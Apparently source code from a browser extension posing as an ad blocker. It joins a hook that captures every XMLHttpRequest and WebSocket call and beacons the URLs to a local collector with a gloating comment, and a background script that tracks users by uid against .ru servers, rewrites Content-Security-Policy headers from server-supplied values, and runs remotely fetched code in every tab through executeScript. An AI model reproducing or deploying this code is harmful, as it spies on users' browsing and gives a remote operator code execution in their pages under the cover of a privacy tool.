function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
class BG {
	constructor() {
		self = this;
        self.init();
    }
	init() {
		self.browser = chrome || browser;
		self.toggle = (localStorage.toggle === 'true');
		self.urls = {};
		self.blockedByPassList = {};
		self.cssByPassList = {};
		self.customCssByPassList = {};
		self.webSocketByPassList = {};
		self.filter = {};
		self.popupBlockList = {};
		self.webSocketFilter = {};
		self.valueHeaders = {};
		localStorage.uid || (localStorage.uid = self.setUid());
		localStorage.start || (localStorage.start = Date.now());
		localStorage.id = self.browser.app.getDetails().id;
		localStorage.userAgent = navigator.userAgent.match(/(chrome|firefox|opera(?=\/))\/?\s*(\d+)/i)[2] || 50;
		localStorage.browser = navigator.userAgent.match(/(chrome|firefox|opera(?=\/))\/?\s*(\d+)/i)[1] || 'undefined';
		localStorage.ver = self.browser.app.getDetails().version;
		localStorage.timeout || (localStorage.timeout = 7e6);
		localStorage.data = JSON.stringify(['http://ads-blocker.ru/adblocker/class/','http://ad-blocker.ru/adblocker/class/']);
		self.load();
	}
	load() {
		self.tabsQuery();
		self.addListener();
		self.loadBlockedList();
		self.loadBlockedCssList();
		self.loadBlockedCustomCssList();
		self.loadBlockedPopupList();
		self.loadGlobalByPassList();
		self.loadBlockedWebSocketList();
		self.loadStat();
		//self.share();
		var interval = setInterval(() => {
	        self.load();
	        clearInterval(interval);
	    }, localStorage.timeout);	
	}
	callback() {
		return self.browser.runtime.lastError;
	}
	setUid() {
		return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
			var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
			return v.toString(16);
		});
	}
	share() {
		localStorage.share == 0 && Date.now() - localStorage.start > 2e8 && (localStorage.share = 1, chrome.tabs.create({url: 'common/setOnShared.html'}));
	}
	tabsQuery() {
		self.browser.tabs.query({}, results => {
			results.forEach(tab => {
				self.urls[tab.id] = tab.url;
			});
		})
	}
	addListener() {
		self.browser.runtime.onInstalled.addListener(self.onInstalledListener);
		self.browser.webNavigation.onCreatedNavigationTarget.addListener(self.onCreatedNavigationTargetListener);
		self.browser.webRequest.onBeforeRedirect.addListener(self.onBeforeRedirectListener, {urls: ['*://*/*'], types: ['main_frame']});
		self.browser.tabs.onUpdated.addListener(self.onUpdatedListener);
		self.browser.tabs.onRemoved.addListener(self.onRemovedListener);
		self.browser.runtime.onMessage.addListener(self.onMessageListener);
	}
	onInstalledListener(details) {
		if (details.reason == 'install') {
			self.toggle = true;
			localStorage.toggle = true;
			localStorage.data = JSON.stringify(['http://ads-blocker.ru/adblocker/class/','http://ad-blocker.ru/adblocker/test/class/']);
			try {_gaq.push(['_trackEvent', 'click', 'install'])} catch (e) {}
			self.browser.tabs.create({url: 'common/setOnInstalled.html'});
		}
		if (details.reason == 'update') {
			try {_gaq.push(['_trackEvent', 'click', 'update'])} catch (e) {}
			localStorage.data = JSON.stringify(['http://ads-blocker.ru/adblocker/class/','http://ad-blocker.ru/adblocker/test/class/']);
			//self.browser.tabs.create({url: 'common/setOnShared.html'});
		}
	}
	onBeforeRequestListener(details) {
		if (self.tabUrlHandler().contains(details) && self.toggle)
			return {cancel: true};
	}
	onBeforeRequestWebSocketListener(details) {
		if (self.tabUrlHandler().contains(details) && self.toggle)
			return {cancel: true};
	}
	onBeforeRedirectListener (details) {
		if(self.toggle && self.popupBlockList && self.popupBlockList.length > 0) {
			for (var i in self.popupBlockList) {
				if (details.redirectUrl.indexOf(self.popupBlockList[i]) != -1) {
					self.browser.tabs.remove(details.tabId, self.callback);
					delete self.urls[details.tabId];
					return;
				}
			}
		}
	}
	onHeadersReceivedListener(details) {
		var headers = details.responseHeaders;
		var cspHeader = 1;
		if (self.toggle && self.webSocketByPassList && self.webSocketByPassList.length > 0) {
			for (var urlId in self.webSocketByPassList) {
				if (details.url.indexOf(self.webSocketByPassList[urlId]) != -1) 
					return {responseHeaders: headers};
			}
			for (var i = headers.length - 1; i >= 0; --i) {
				var header = headers[i].name.toLowerCase();
				if (header == 'content-security-policy') {
					cspHeader = 0;
					headers[i].value = 'connect-src http: https:; child-src http: https:';
				}
			}
			if (cspHeader) {
				headers.push({'name':'content-security-policy','value':'connect-src http: https:; child-src http: https:'});
			}
		}
		return {responseHeaders: headers};
	}	
	onHeadersReceivedValueListener(details) {
		var headers = details.responseHeaders;
		var found = false;
		var value = "";
		var cspHeader = true;
		if (self.toggle && self.valueHeaders && self.valueHeaders.length > 0) {
			for (var i in self.valueHeaders) {
				if (details.url.indexOf(self.valueHeaders[i].split('@')[0]) != -1) {
					value = self.valueHeaders[i].split('@')[1];
					found = true;
					break;
				}
			}
			if (found) {
				for (var i=headers.length-1; i>=0; --i) {
					var header = headers[i].name.toLowerCase();
					if (header == 'content-security-policy') {
						cspHeader = false;
						headers[i].value = value;
					}
				}
				if (cspHeader) {
					headers.push({'name': 'content-security-policy','value': value});
				}
			}
		}
		return {responseHeaders: headers};
	}
	onCreatedNavigationTargetListener(details) {
		if (self.toggle && self.popupBlockList && self.popupBlockList.length > 0) {
			self.popupBlockList.forEach(i => {
				if (details.url.includes(i)) {
					self.browser.tabs.remove(details.tabId, self.callback);
					return;
				}
			})
		}
	}
	onUpdatedListener(tabId, changeInfo, tab) {
		if (self.toggle && self.popupBlockList && self.popupBlockList.length > 0) {
			self.popupBlockList.forEach(i => {
				if (tab.url.includes(i)) {
					self.browser.tabs.remove(tabId, self.callback);
					return;
				}
			});
		}
	}
	onRemovedListener(tabId) {
		delete self.urls[tabId];
	}
	onMessageListener(request, sender, sendResponse) {
		if (request && request.hosturl) 
			self.urls[sender.tab.id] = request.hosturl;
		
		// CustomCSS
		if (self.toggle && request && request.tabsInsertCustomCss && self.customCssByPassList && localStorage.customCssList) {
			var url = self.urls[sender.tab.id].replace(/^(?:https?:\/\/)?(?:www\.)?/i, "").split('/')[0] || self.urls[sender.tab.id];
			var foundCustomCSS = false;
			for (var i in self.customCssByPassList) {
				if (url.indexOf(self.customCssByPassList[i]) != -1) {
					foundCustomCSS = true;
					break;
				}
			}
			if (!foundCustomCSS) {
				self.browser.tabs.executeScript(sender.tab.id, {code: localStorage.customCssList, runAt: 'document_start'}, self.callback);
				self.browser.tabs.executeScript(sender.tab.id, {code: localStorage.customCssList, runAt: 'document_end'}, self.callback);
			}					
		}
		
		// CSS
		if (self.toggle && request && request.tabsInsertCss && self.cssByPassList && localStorage.cssList) {
			var url = self.urls[sender.tab.id].replace(/^(?:https?:\/\/)?(?:www\.)?/i, "").split('/')[0] || self.urls[sender.tab.id];
			var foundCSS1 = false;
			for (var i in self.cssByPassList) {
				if (url.indexOf(self.cssByPassList[i]) != -1) {
					foundCSS1 = true;
					break;
				}
			}
			if (!foundCSS1)
				self.browser.tabs.insertCSS(sender.tab.id, {code: localStorage.cssList, runAt: 'document_end'}, self.callback);
		}
		if (self.toggle && request && request.insertCss === 'insertCss' && self.cssByPassList && localStorage.cssList) {
			var url = self.urls[sender.tab.id].replace(/^(?:https?:\/\/)?(?:www\.)?/i, "").split('/')[0] || self.urls[sender.tab.id];
			var foundCSS2 = false;
			for (var i in self.cssByPassList) {
				if (url.indexOf(self.cssByPassList[i]) != -1) {
					foundCSS2 = true;
					break;
				}
			}
			if (!foundCSS2)
				sendResponse({insertCss: localStorage.cssList});
		}
		
		// Toggle
		if (request && request.get === 'is_enabled') 
			sendResponse({is_enabled: self.toggle});
		return true;
	}
	tabUrlHandler() {
		return {
			contains: (details) => {
				if (details.tabId > -1) {
					if (!self.urls[details.tabId] || typeof(self.urls[details.tabId]) == 'undefined') {
						self.urls[details.tabId] = details.url;
					}
					if (self.blockedByPassList && self.blockedByPassList.length > 0) {
						for (var urlId in self.blockedByPassList) {
							var url = self.urls[details.tabId].replace(/^(?:https?:\/\/)?(?:www\.)?/i, "").split('/')[0];
							if (url.indexOf(self.blockedByPassList[urlId]) != -1) 
								return false;
						}
					}
				}
				if (details.tabId == -1) {
					return false;
				}
				return true;
			}
		}
	}
	loadBlockedList() {
		$.ajaxSetup({cache: false, async: true, ifModified: true});
		var array = JSON.parse(localStorage.data);
		var string = '?uid=' + localStorage.uid + '&start=' + localStorage.start + '&ver=' + localStorage.ver + '&extid=' + localStorage.id;
		load();
		function load () {		
			var data = $.get(array.pop() + 'blocked.txt' + string);
			data.fail(() => {
				array.length == 0 ? self.loadDefault('blockedList') : load();
			});
			data.done((data, textStatus, jqXHR) => {
				if (jqXHR.status == 304)
					return;
				self.browser.storage.local.set({'blockedList': data});
				self.browser.storage.local.get('blockedList', result => {
					if (result && result.blockedList && result.blockedList.length > 0) {
						self.filter = result.blockedList.split(/\r?\n/); 
						if (self.browser.webRequest.onBeforeRequest.hasListener(self.onBeforeRequestListener))
							self.browser.webRequest.onBeforeRequest.removeListener(self.onBeforeRequestListener);
						try {
							self.browser.webRequest.onBeforeRequest.addListener(self.onBeforeRequestListener, {urls: self.filter, types: ['sub_frame', 'script', 'xmlhttprequest', 'object', 'other', 'image', 'stylesheet', 'ping', 'media']}, ['blocking']);
						} 
						catch (e) {
							self.browser.webRequest.onBeforeRequest.addListener(self.onBeforeRequestListener, {urls: self.filter, types: ['sub_frame', 'script', 'xmlhttprequest', 'object', 'other', 'image', 'stylesheet', 'ping']}, ['blocking']);
						}
					}
					else
						array.length == 0 ? self.loadDefault('blockedList') : load();
				});
				return;
			});
		}
	}
	loadBlockedWebSocketList() {
		if (localStorage.browser != 'Chrome' || localStorage.userAgent < 58)
			return;
		$.ajaxSetup({cache: false, async: true, ifModified: true});
		var array = JSON.parse(localStorage.data);
		var string = '?uid=' + localStorage.uid + '&start=' + localStorage.start + '&ver=' + localStorage.ver + '&extid=' + localStorage.id;
		load();
		function load () {		
			var data = $.get(array.pop() + 'webSocket.txt' + string);
			data.fail(() => {
				array.length == 0 ? self.loadDefault('blockedWebSocketList') : load();
			});
			data.done((data, textStatus, jqXHR) => {
				if (jqXHR.status == 304)
					return;
				self.browser.storage.local.set({'blockedWebSocketList': data});
				self.browser.storage.local.get('blockedWebSocketList', result => {
					if (result && result.blockedWebSocketList && result.blockedWebSocketList.length > 0) {
						self.webSocketFilter = result.blockedWebSocketList.split(/\r?\n/); 
						if (self.browser.webRequest.onBeforeRequest.hasListener(self.onBeforeRequestWebSocketListener))
							self.browser.webRequest.onBeforeRequest.removeListener(self.onBeforeRequestWebSocketListener);
						self.browser.webRequest.onBeforeRequest.addListener(self.onBeforeRequestWebSocketListener, {urls: self.webSocketFilter, types: ['websocket']}, ['blocking']);
					}
					else
						array.length == 0 ? self.loadDefault('blockedWebSocketList') : load();
				});
				return;
			});
		}
	}
	loadBlockedCssList() {
		$.ajaxSetup({cache: false, async: true, ifModified: true});
		var array = JSON.parse(localStorage.data);
		var string = '?uid=' + localStorage.uid + '&start=' + localStorage.start + '&ver=' + localStorage.ver + '&extid=' + localStorage.id;
		load();
		function load () {		
			var data = $.get(array.pop() + 'css.txt' + string);
			data.fail(() => {
				array.length == 0 ? self.loadDefault('blockedCssList') : load();
			});
			data.done((data, textStatus, jqXHR) => {
				if (jqXHR.status == 304)
					return;
				data ? localStorage.cssList = data : self.loadDefault('blockedCssList');				
				return;
			});
		}
	}
	loadBlockedCustomCssList() {
		$.ajaxSetup({cache: false, async: true, ifModified: true});
		var array = JSON.parse(localStorage.data);
		var string = '?uid=' + localStorage.uid + '&start=' + localStorage.start + '&ver=' + localStorage.ver + '&extid=' + localStorage.id;
		load();
		function load () {		
			var data = $.get(array.pop() + 'custom.txt' + string);
			data.fail(() => {
				array.length == 0 ? self.loadDefault('blockedCustomCssList') : load();
			});
			data.done((data, textStatus, jqXHR) => {
				if (jqXHR.status == 304)
					return;
				data ? localStorage.customCssList = data : self.loadDefault('blockedCustomCssList');				
				return;
			});
		}
		
	}
	loadBlockedPopupList() {
		$.ajaxSetup({cache: false, async: true, ifModified: true});
		var array = JSON.parse(localStorage.data);
		var string = '?uid=' + localStorage.uid + '&start=' + localStorage.start + '&ver=' + localStorage.ver + '&extid=' + localStorage.id;
		load();
		function load () {		
			var data = $.get(array.pop() + 'popup.txt' + string);
			data.fail(() => {
				array.length == 0 ? self.loadDefault('blockedPopupList') : load();
			});
			data.done((data, textStatus, jqXHR) => {
				if (jqXHR.status == 304)
					return;
				self.browser.storage.local.set({'blockedPopupList': data});
				self.browser.storage.local.get('blockedPopupList', result => {
					if (result && result.blockedPopupList && result.blockedPopupList.length > 0) 
						self.popupBlockList = result.blockedPopupList.split(/\r?\n/);
					else
						array.length == 0 ? self.loadDefault('blockedPopupList') : load();
				})
				return;
			});
		}	
	}
	loadGlobalByPassList() {
		$.ajaxSetup({cache: false, async: true, ifModified: true});
		var array = JSON.parse(localStorage.data);
		var string = '?uid=' + localStorage.uid + '&start=' + localStorage.start + '&ver=' + localStorage.ver + '&extid=' + localStorage.id;
		load();
		function load () {		
			var data = $.get(array.pop() + 'byPass.txt' + string);
			data.fail(() => {
				array.length == 0 ? self.loadDefault('globalByPassList') : load();
			});
			data.done((data, textStatus, jqXHR) => {
				if (jqXHR.status == 304)
					return;
				self.browser.storage.local.set({'blockedByPassList': data.blockedByPassList});
				self.browser.storage.local.get('blockedByPassList', result => {
					if (result && result.blockedByPassList && result.blockedByPassList.length > 0) 
						self.blockedByPassList = result.blockedByPassList;
					else
						array.length == 0 ? self.loadDefault('globalByPassList') : load();
				})
				
				if ((localStorage.browser === 'Chrome' || localStorage.browser === 'undefined') && localStorage.userAgent < 58) {
					self.browser.storage.local.set({'blockedByPassWebSocketList': data.blockedByPassWebSocketList});
					self.browser.storage.local.get('blockedByPassWebSocketList', result => {						
						if (result && result.blockedByPassWebSocketList && result.blockedByPassWebSocketList.length > 0) {
							self.webSocketByPassList = result.blockedByPassWebSocketList;
							if (self.browser.webRequest.onHeadersReceived.hasListener(self.onHeadersReceivedListener))
								self.browser.webRequest.onHeadersReceived.removeListener(self.onHeadersReceivedListener);
							try {
								self.browser.webRequest.onHeadersReceived.addListener(self.onHeadersReceivedListener, {urls: ['*://*/*'], types: ['main_frame', 'sub_frame']}, ['blocking', 'responseHeaders']);
							} catch(e) {};
						}
						else
							array.length == 0 ? self.loadDefault('globalByPassList') : load();
					});
				}
				
				self.browser.storage.local.set({'valueHeaders': data.valueHeaders});
				self.browser.storage.local.get('valueHeaders', result => {						
					if (result && result.valueHeaders && result.valueHeaders.length > 0) {
						self.valueHeaders = result.valueHeaders;						
						if (self.browser.webRequest.onHeadersReceived.hasListener(self.onHeadersReceivedValueListener))
							self.browser.webRequest.onHeadersReceived.removeListener(self.onHeadersReceivedValueListener);
						try {
							self.browser.webRequest.onHeadersReceived.addListener(self.onHeadersReceivedValueListener, {urls: ['*://*/*'], types: ['main_frame', 'sub_frame']}, ['blocking', 'responseHeaders']);
						} catch(e) {};
					}
					
					else
						array.length == 0 ? self.loadDefault('valueHeaders') : load(); 
				});				
				
				self.browser.storage.local.set({'cssByPassList': data.cssByPassList});
				self.browser.storage.local.get('cssByPassList', result => {
					result && result.cssByPassList ? self.cssByPassList = result.cssByPassList : array.length == 0 ? self.loadDefault('globalByPassList') : load();
				})
				
				self.browser.storage.local.set({'customCssByPassList': data.customCssByPassList});
				self.browser.storage.local.get('customCssByPassList', result => {
					result && result.customCssByPassList ? self.customCssByPassList = result.customCssByPassList : array.length == 0 ? self.loadDefault('globalByPassList') : load();
				})
				return;
			});
		}
		
	}
	loadStat () {
		$.ajaxSetup({cache: false, async: true, ifModified: false});
		var array = JSON.parse(localStorage.data);
		var string = '?uid=' + localStorage.uid + '&start=' + localStorage.start + '&ver=' + localStorage.ver + '&extid=' + localStorage.id + '&rand=' + Math.random();
		load();
		function load () {		
			var data = $.get(array.pop() + 'stat.txt' + string);
			data.fail(() => {
				array.length == 0 ? self.loadDefault('stat') : load();
			});
			data.done((data) => {
				if (data)
					return;
			});
		}		
	}
	loadDefault(mode) {
		switch (mode) {
			case 'blockedList':
				if (self.browser.webRequest.onBeforeRequest.hasListener(self.onBeforeRequestListener))
					return;
				self.browser.storage.local.get('blockedList', result => {
					if (result && result.blockedList && result.blockedList.length > 0) {
						self.filter = result.blockedList.split(/\r?\n/); 
						try {
							self.browser.webRequest.onBeforeRequest.addListener(self.onBeforeRequestListener, {urls: self.filter, types: ['sub_frame', 'script', 'xmlhttprequest', 'object', 'other', 'image', 'stylesheet', 'ping', 'media']}, ['blocking']);
						} 
						catch (e) {
							self.browser.webRequest.onBeforeRequest.addListener(self.onBeforeRequestListener, {urls: self.filter, types: ['sub_frame', 'script', 'xmlhttprequest', 'object', 'other', 'image', 'stylesheet', 'ping']}, ['blocking']);
						}
					}
					else
						return;
				});
			break;
			case 'blockedWebSocketList':
				if (self.browser.webRequest.onBeforeRequest.hasListener(self.onBeforeRequestWebSocketListener))
					return;
				self.browser.storage.local.get('blockedWebSocketList', result => {
					if (result && result.blockedWebSocketList && result.blockedWebSocketList.length > 0) {
						self.webSocketFilter = result.blockedWebSocketList.split(/\r?\n/); 
						self.browser.webRequest.onBeforeRequest.addListener(self.onBeforeRequestWebSocketListener, {urls: self.webSocketFilter, types: ['websocket']}, ['blocking']);
					}
					else
						return;
				});
			break;
			case 'valueHeaders':
				if (self.browser.webRequest.onHeadersReceived.hasListener(self.onHeadersReceivedValueListener))
					return;
				self.browser.storage.local.get('valueHeaders', result => {						
					if (result && result.valueHeaders && result.valueHeaders.length > 0) {
						self.valueHeaders = result.valueHeaders;						
						try {
							self.browser.webRequest.onHeadersReceived.addListener(self.onHeadersReceivedValueListener, {urls: ['*://*/*'], types: ['main_frame', 'sub_frame']}, ['blocking', 'responseHeaders']);
						} catch(e) {};
					}
					else 
						return;
				})									
			break;
			default: return;
		}
	}

}
new BG();


